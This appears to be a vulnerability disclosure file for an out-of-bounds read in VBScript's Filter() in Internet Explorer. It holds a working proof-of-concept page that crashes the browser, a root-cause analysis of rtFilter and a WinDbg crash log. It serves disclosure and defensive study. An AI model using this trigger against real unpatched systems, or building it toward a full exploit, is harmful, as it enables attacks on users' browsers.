@@ -1,0 +1,100 @@
+<!--
+There is an out-of-bounds vulnerability in Microsoft VBScript. The vulnerability has been confirmed in Internet Explorer on Windows 7 with the latest patches applied.
+
+PoC:
+(Note that Page Heap might need to be enabled to observe the crash)
+
+===============================================================================
+-->
+
+<!-- saved from url=(0016)http://localhost -->
+<meta http-equiv="x-ua-compatible" content="IE=10">
+<script type="text/vbscript">
+On Error Resume Next
+
+Class class1
+  Public Default Property Get x
+    ReDim arr(1)
+  End Property
+End Class
+
+set c = new class1
+arr = Array("b", "b", "a", "a", c)
+Call Filter(arr, "a")
+
+</script>
+
+<!--
+===============================================================================
+
+Preliminary Analysis:
+
+The rtFilter function is called from VbsFilter when a Filter() function is invoked. The Filter() function takes an array of strings and a string as params and returns another array containing just those elements from the original array that contain the specified (sub)string.
+
+The issue is that the input array can be resized during the rtFilter call (by invoking a default getter on one of the input array members) and rtFilter fails to handle this case correctly. While rtFilter does implement some logic to determine if the input array has been resized, this logic fails to take into account elements of the input array that *do not match* the input string (Notice the "b" strings in the PoC and how the PoC would stop to work if those are all changed to "a").
+
+Debug log:
+
+===============================================================================
+
+(a04.604): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000002 ecx=0d9d6fe0 edx=0d9cf000 esi=0d9cf000 edi=0d924ff6
+eip=767d497b esp=09d2bcbc ebp=09d2bcc8 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+OLEAUT32!VariantCopy+0xb:
+767d497b 0fb73e          movzx   edi,word ptr [esi]       ds:002b:0d9cf000=????
+
+0:007> r
+eax=00000000 ebx=00000002 ecx=0d9d6fe0 edx=0d9cf000 esi=0d9cf000 edi=0d924ff6
+eip=767d497b esp=09d2bcbc ebp=09d2bcc8 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+OLEAUT32!VariantCopy+0xb:
+767d497b 0fb73e          movzx   edi,word ptr [esi]       ds:002b:0d9cf000=????
+
+0:007> k
+ # ChildEBP RetAddr  
+00 09d2bcc8 6f81b301 OLEAUT32!VariantCopy+0xb
+01 09d2bd04 6f81b607 vbscript!rtFilter+0x183
+02 09d2bd40 6f805407 vbscript!VbsFilter+0x128
+03 09d2bd5c 6f80358d vbscript!StaticEntryPoint::Call+0x2f
+04 09d2be74 6f805d5e vbscript!CScriptRuntime::RunNoEH+0x2340
+05 09d2bec4 6f805c7b vbscript!CScriptRuntime::Run+0xc3
+06 09d2bfd4 6f82e888 vbscript!CScriptEntryPoint::Call+0x10b
+07 09d2c038 6f80642b vbscript!CSession::Execute+0x12b
+08 09d2c088 6f80bc88 vbscript!COleScript::ExecutePendingScripts+0x14f
+09 09d2c104 6f80d1b9 vbscript!COleScript::ParseScriptTextCore+0x2a4
+0a 09d2c130 6d577d14 vbscript!COleScript::ParseScriptText+0x29
+0b 09d2c168 6d5781eb MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+0c 09d2c1d8 6d22d1d1 MSHTML!CScriptCollection::ParseScriptText+0x1c6
+0d 09d2c2c4 6d22cd73 MSHTML!CScriptData::CommitCode+0x31e
+0e 09d2c344 6d22d90d MSHTML!CScriptData::Execute+0x232
+0f 09d2c364 6d554bb6 MSHTML!CHtmScriptParseCtx::Execute+0xed
+10 09d2c3b8 6cf4c33d MSHTML!CHtmParseBase::Execute+0x201
+11 09d2c3d4 6cf4bd5f MSHTML!CHtmPost::Broadcast+0x182
+12 09d2c50c 6d013799 MSHTML!CHtmPost::Exec+0x617
+13 09d2c52c 6d0136ff MSHTML!CHtmPost::Run+0x3d
+14 09d2c548 6d01aef7 MSHTML!PostManExecute+0x61
+15 09d2c55c 6d01bce8 MSHTML!PostManResume+0x7b
+16 09d2c58c 6d0024b8 MSHTML!CHtmPost::OnDwnChanCallback+0x38
+17 09d2c5a4 6cefd4f3 MSHTML!CDwnChan::OnMethodCall+0x2f
+18 09d2c5f4 6cefd072 MSHTML!GlobalWndOnMethodCall+0x1a1
+19 09d2c648 764262fa MSHTML!GlobalWndProc+0x103
+1a 09d2c674 76426d3a user32!InternalCallWinProc+0x23
+1b 09d2c6ec 764277c4 user32!UserCallWinProcCheckWow+0x109
+1c 09d2c74c 7642788a user32!DispatchMessageWorker+0x3b5
+1d 09d2c75c 6e2fab7c user32!DispatchMessageW+0xf
+1e 09d2f928 6e3675f8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\syswow64\iertutil.dll - 
+1f 09d2f9e8 77006b7c IEFRAME!LCIETab_ThreadProc+0x3e7
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Internet Explorer\IEShims.dll - 
+WARNING: Stack unwind information not available. Following frames may be wrong.
+20 09d2fa00 714f3a31 iertutil!PrivateCoInternetCombineIUri+0x2bbc
+21 09d2fa38 7735343d IEShims!IEShims_SetRedirectRegistryForThread+0x1c1
+22 09d2fa44 77879802 kernel32!BaseThreadInitThunk+0xe
+23 09d2fa84 778797d5 ntdll!__RtlUserThreadStart+0x70
+24 09d2fa9c 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+===============================================================================
+-->
